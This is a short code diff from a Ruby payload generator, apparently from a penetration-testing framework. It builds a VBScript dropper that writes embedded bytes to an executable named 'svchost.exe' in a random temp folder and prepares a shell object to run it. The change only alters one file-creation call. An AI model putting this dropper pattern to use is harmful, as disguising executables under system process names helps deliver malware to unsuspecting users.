@@ -855,7 +855,7 @@ require 'digest/sha1'
 		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
 		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
 		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
-		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
+		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe}, true , false)\r\n"
 		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
 		vbs << "#{var_stream}.Close\r\n"
 		vbs << "Dim #{var_shell}\r\n"
